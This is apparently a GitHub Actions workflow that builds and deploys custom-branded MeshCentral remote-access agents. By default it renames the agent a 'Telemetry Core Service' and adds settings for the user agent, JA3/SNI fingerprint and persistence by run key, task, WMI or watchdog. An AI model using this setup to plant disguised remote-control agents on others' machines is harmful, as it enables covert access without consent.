name: Build and Release Custom MeshAgent

on:
  push:
    branches: [ main, master ]
    tags:
      - 'v*'
  pull_request:
    branches: [ main, master ]
  workflow_dispatch:
    inputs:
      deploy_to_server:
        description: 'Deploy to MeshCentral server after build'
        required: false
        default: 'false'
        type: boolean

permissions:
  contents: write

env:
  BRANDING_CONFIG: 'ip_only_acme.json'
  MESHCENTRAL_SERVER: 'high.support'
  MESHCENTRAL_AGENTS_PATH: '/opt/meshcentral/meshcentral-data/agents'

jobs:
  build-windows:
    runs-on: windows-latest
    strategy:
      matrix:
        arch: [x64, x86]
        include:
          - arch: x64
            platform: x64
            output_name: MeshService64.exe
          - arch: x86
            platform: Win32
            output_name: MeshService.exe

    steps:
      - name: Checkout repository
        uses: actions/checkout@v4
        with:
          submodules: recursive
          fetch-depth: 0

      - name: Add MSBuild to PATH
        uses: microsoft/setup-msbuild@v1.1

      - name: Setup Python
        uses: actions/setup-python@v5
        with:
          python-version: '3.x'

      - name: Fetch branding configuration
        id: fetch_config
        shell: pwsh
        run: |
          if (Test-Path "./branding_config.json") {
            Write-Host "Using branding config from repository"
            Get-Content "./branding_config.json"
          }
          elseif ("${{ secrets.BRANDING_CONFIG_JSON }}" -ne "") {
            "${{ secrets.BRANDING_CONFIG_JSON }}" | Out-File -FilePath "./branding_config.json" -Encoding utf8
            Write-Host "Using branding config from secrets"
            Get-Content "./branding_config.json"
          }
          else {
            Write-Host "Creating default branding config"
            $default = @{
              branding = @{
                companyName = "Acme Corp"
                serviceName = "AcmeTelemetryCore"
                displayName = "Acme Telemetry Core Service"
                binaryName = "AcmeTelemetryCore.exe"
                productName = "Acme Telemetry Core"
                description = "Acme Telemetry Core Service"
                logPath = "C:/ProgramData/Acme/TelemetryCore/logs"
              }
              network = @{
                primaryEndpoint = "wss://high.support:443/agent.ashx"
                userAgent = "AcmeAgent/1.0"
              }
            }
            $default | ConvertTo-Json -Depth 5 | Out-File -FilePath "./branding_config.json" -Encoding utf8
            Get-Content "./branding_config.json"
          }

      - name: Generate branding headers
        shell: pwsh
        run: |
          $script = @'
          import json, os
          cfg = json.load(open("branding_config.json","r"))
          branding = cfg.get("branding", {})
          network = cfg.get("network", {})
          service_name = branding.get("serviceName", "MeshAgent")
          display_name = branding.get("displayName", "Mesh Agent Background Service")
          company_name = branding.get("companyName", "")
          product_name = branding.get("productName", service_name)
          description = branding.get("description", display_name)
          binary_name = branding.get("binaryName", f"{service_name}.exe")
          log_path = branding.get("logPath", "C:/ProgramData/MeshAgent/logs")
          endpoint = network.get("primaryEndpoint", "")
          user_agent = network.get("userAgent", "MeshAgent/1.0")
          header = f'''/* Generated file – do not edit. */
          #ifndef GENERATED_MESHAGENT_BRANDING_H
          #define GENERATED_MESHAGENT_BRANDING_H
          #undef MESH_AGENT_SERVICE_FILE
          #define MESH_AGENT_SERVICE_FILE TEXT("{service_name}")
          #undef MESH_AGENT_SERVICE_NAME
          #define MESH_AGENT_SERVICE_NAME TEXT("{display_name}")
          #undef MESH_AGENT_COMPANY_NAME
          #define MESH_AGENT_COMPANY_NAME "{company_name}"
          #undef MESH_AGENT_PRODUCT_NAME
          #define MESH_AGENT_PRODUCT_NAME "{product_name}"
          #undef MESH_AGENT_FILE_DESCRIPTION
          #define MESH_AGENT_FILE_DESCRIPTION "{description}"
          #undef MESH_AGENT_INTERNAL_NAME
          #define MESH_AGENT_INTERNAL_NAME "{binary_name}"
          #undef MESH_AGENT_COPYRIGHT
          #define MESH_AGENT_COPYRIGHT "Apache 2.0 License"
          #undef MESH_AGENT_LOG_DIRECTORY
          #define MESH_AGENT_LOG_DIRECTORY TEXT("{log_path}")
          #define MESH_AGENT_NETWORK_ENDPOINT "{endpoint}"
          #define MESH_AGENT_NETWORK_SNI NULL
          #define MESH_AGENT_NETWORK_USER_AGENT "{user_agent}"
          #define MESH_AGENT_NETWORK_JA3 NULL
          #define MESH_AGENT_PERSIST_RUNKEY 0
          #define MESH_AGENT_PERSIST_TASK 0
          #define MESH_AGENT_PERSIST_WMI 0
          #define MESH_AGENT_PERSIST_WATCHDOG 1
          #endif
          '''
          os.makedirs("meshcore/generated", exist_ok=True)
          open("meshcore/generated/meshagent_branding.h", "w").write(header)
          print("Generated branding header successfully")
          '@
          $script | Out-File -FilePath "generate_branding.py" -Encoding utf8
          python generate_branding.py

      - name: Restore NuGet packages
        shell: pwsh
        run: |
          Write-Host "Restoring NuGet packages for MeshAgent-2022.sln"
          nuget restore MeshAgent-2022.sln

      - name: Build MeshService (${{ matrix.arch }})
        shell: pwsh
        run: |
          Write-Host "Building MeshService for ${{ matrix.arch }} platform"
          msbuild MeshAgent-2022.sln `
            /t:MeshService-2022:Build `
            /p:Configuration=Release `
            /p:Platform=${{ matrix.platform }} `
            /p:WindowsTargetPlatformVersion=10.0 `
            /p:PlatformToolset=v143 `
            /m `
            /v:minimal `
            /fl `
            /flp:logfile=build_${{ matrix.arch }}.log

      - name: Locate and rename binary
        id: locate_binary
        shell: pwsh
        run: |
          $exePath = Get-ChildItem -Path "." -Recurse -Filter "MeshService.exe" | Where-Object {
            $_.DirectoryName -like "*Release*" -and $_.DirectoryName -like "*${{ matrix.arch }}*"
          } | Select-Object -First 1
          if ($exePath) {
            New-Item -ItemType Directory -Force -Path "./artifacts" | Out-Null
            Copy-Item $exePath.FullName -Destination "./artifacts/${{ matrix.output_name }}"
            echo "artifact_path=./artifacts/${{ matrix.output_name }}" >> $env:GITHUB_OUTPUT
          } else {
            Write-Host "ERROR: Could not find built executable"
            exit 1
          }

      - name: Upload build logs (if exists)
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: build-log-${{ matrix.arch }}
          path: build_${{ matrix.arch }}.log
          if-no-files-found: ignore
          retention-days: 30

      - name: Upload artifact
        uses: actions/upload-artifact@v4
        with:
          name: ${{ matrix.output_name }}
          path: ./artifacts/${{ matrix.output_name }}
          retention-days: 90

      - name: Upload to release (on tag)
        if: startsWith(github.ref, 'refs/tags/v')
        uses: softprops/action-gh-release@v2
        with:
          files: ./artifacts/${{ matrix.output_name }}
          draft: false
          prerelease: false
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}

  deploy-to-server:
    needs: build-windows
    runs-on: ubuntu-latest
    env:
      SSH_PRIVATE_KEY: ${{ secrets.SSH_PRIVATE_KEY }}
    if: |
      (github.event_name == 'workflow_dispatch' && github.event.inputs.deploy_to_server == 'true') ||
      (github.event_name == 'push' && startsWith(github.ref, 'refs/tags/v'))
    steps:
      - name: Download artifacts
        uses: actions/download-artifact@v4
        with:
          path: ./artifacts

      - name: Setup SSH
        if: ${{ env.SSH_PRIVATE_KEY != '' }}
        run: |
          mkdir -p ~/.ssh
          echo "${{ env.SSH_PRIVATE_KEY }}" > ~/.ssh/id_rsa
          chmod 600 ~/.ssh/id_rsa
          ssh-keyscan -H ${{ env.MESHCENTRAL_SERVER }} >> ~/.ssh/ssh_known_hosts

      - name: Deploy to MeshCentral server
        if: ${{ env.SSH_PRIVATE_KEY != '' }}
        run: |
          scp ./artifacts/MeshService64.exe/MeshService64.exe root@${{ env.MESHCENTRAL_SERVER }}:${{ env.MESHCENTRAL_AGENTS_PATH }}/
          scp ./artifacts/MeshService.exe/MeshService.exe root@${{ env.MESHCENTRAL_SERVER }}:${{ env.MESHCENTRAL_AGENTS_PATH }}/
          ssh root@${{ env.MESHCENTRAL_SERVER }} "systemctl restart meshcentral"

      - name: Verify deployment
        if: ${{ env.SSH_PRIVATE_KEY != '' }}
        run: |
          sleep 10
          ssh root@${{ env.MESHCENTRAL_SERVER }} "systemctl status meshcentral --no-pager"

  create-release:
    needs: build-windows
    runs-on: ubuntu-latest
    if: startsWith(github.ref, 'refs/tags/v')
    steps:
      - name: Download all artifacts
        uses: actions/download-artifact@v4
        with:
          path: ./artifacts

      - name: Create release notes
        run: |
          cat > release_notes.md << 'EOF'
          ## Custom MeshAgent Binaries
          This release contains custom-branded MeshAgent binaries:
          - MeshService64.exe (64-bit)
          - MeshService.exe (32-bit)
          Built from commit: ${{ github.sha }}
          EOF

      - name: Create GitHub Release (aggregate)
        uses: softprops/action-gh-release@v2
        with:
          files: ./artifacts/**/*.exe
          body_path: release_notes.md
          draft: false
          prerelease: false
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
